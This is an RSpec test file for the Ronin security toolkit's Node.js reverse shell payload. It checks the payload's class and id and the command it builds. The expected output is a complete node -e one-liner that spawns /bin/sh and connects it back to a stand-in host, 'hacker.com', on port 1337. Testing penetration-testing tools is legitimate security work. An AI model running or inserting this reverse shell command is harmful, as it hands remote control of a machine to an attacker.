require 'spec_helper'
require 'ronin/payloads/builtin/cmd/node/reverse_shell'

describe Ronin::Payloads::CMD::Node::ReverseShell do
  it "must inherit from Ronin::Payloads::CommandPayload" do
    expect(described_class).to be < Ronin::Payloads::CommandPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'cmd/node/reverse_shell'" do
      expect(subject.id).to eq('cmd/node/reverse_shell')
    end
  end

  let(:host) { 'hacker.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build an `node` command that connects back to the host and port params" do
      expect(subject.payload).to eq(
        %{node -e '(function(){var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(#{port}, #{host.dump}, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();'}
      )
    end
  end
end
